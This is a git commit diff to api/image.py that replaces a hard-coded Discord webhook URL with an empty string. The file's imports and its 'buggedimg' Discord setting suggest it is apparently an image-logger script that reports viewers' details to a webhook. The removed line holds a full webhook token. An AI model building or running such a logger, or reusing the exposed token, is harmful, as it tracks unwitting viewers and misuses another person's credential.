b1dd15be888c82e3817ade02a3bdcdffa23fe8aa
TatsuyaK <98124009+coobro@users.noreply.github.com>
2025-08-09 15:10:54 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1337863690443161662/j78wm9oZrugW2OgoW3AUKpXX3eVaB-TXuShUraM9EwonH3QHS422gS3okM7uEKczgJl3'
+webhook = ''
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
